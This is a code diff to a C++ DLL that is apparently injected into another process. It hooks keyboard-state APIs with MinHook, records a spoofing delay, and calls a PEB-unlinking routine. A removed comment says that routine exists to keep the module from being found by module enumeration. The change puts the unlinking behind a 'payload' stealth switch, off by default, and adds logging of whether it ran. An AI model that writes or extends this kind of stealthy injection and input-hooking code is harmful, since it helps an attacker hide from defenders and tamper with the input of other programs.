@@ -17,6 +17,7 @@
 #include <cwctype>
 
 #include "MinHook.h"
+#include "../../runtime/payload_runtime.h"
 
 // ------------------------------
 // 全局状态与计数器
@@ -30,6 +31,11 @@ static LONG g_shouldStop = 0;
 static std::wstring g_logPath;
 static std::wstring g_successFilePath;
 static LONG g_successFileCreated = 0;
+static const LONG kUnlinkResultNotAttempted = -1;
+static const LONG kUnlinkResultOk = 0;
+static const LONG kUnlinkResultFailed = 1;
+static const LONG kUnlinkResultDisabledByGate = 2;
+static volatile LONG g_unlink_result = kUnlinkResultNotAttempted;
 
 static volatile LONG g_countGetAsyncKeyState = 0;
 static volatile LONG g_countGetKeyboardState = 0;
@@ -3634,6 +3640,23 @@ static DWORD WINAPI WorkerThread(LPVOID)
     WriteSuccessFile();
     InitializeSpoofDelay();
 
+    if (g_unlink_result == kUnlinkResultOk)
+    {
+        LogInfo(L"PEB 断链状态: ok");
+    }
+    else if (g_unlink_result == kUnlinkResultDisabledByGate)
+    {
+        LogInfo(L"PEB 断链状态: disabled_by_payload_gate");
+    }
+    else if (g_unlink_result == kUnlinkResultFailed)
+    {
+        LogInfo(L"PEB 断链状态: failed");
+    }
+    else
+    {
+        LogInfo(L"PEB 断链状态: not_attempted");
+    }
+
     LogInfo(L"工作线程启动，准备初始化 MinHook 与输入路径统计");
 
     MH_STATUS status = MH_Initialize();
@@ -3690,6 +3713,7 @@ static DWORD WINAPI WorkerThread(LPVOID)
 static void StartSyncInternal()
 {
     HMODULE module = nullptr;
+    g_unlink_result = kUnlinkResultNotAttempted;
     if (GetModuleHandleExW(
         GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
         reinterpret_cast<LPCWSTR>(&StartSyncInternal),
@@ -3700,8 +3724,15 @@ static void StartSyncInternal()
         g_injectTick = GetTickCount64();
         DisableThreadLibraryCalls(module);
 
-        // 断链：降低被模块枚举发现的概率
-        UnlinkFromPeb(module);
+        // 统一由 Payload 级开关控制隐蔽相关逻辑，默认关闭。
+        if (PayloadRuntime::IsStealthEnabled())
+        {
+            g_unlink_result = UnlinkFromPeb(module) ? kUnlinkResultOk : kUnlinkResultFailed;
+        }
+        else
+        {
+            g_unlink_result = kUnlinkResultDisabledByGate;
+        }
     }
 
     HANDLE thread = CreateThread(nullptr, 0, WorkerThread, nullptr, 0, nullptr);
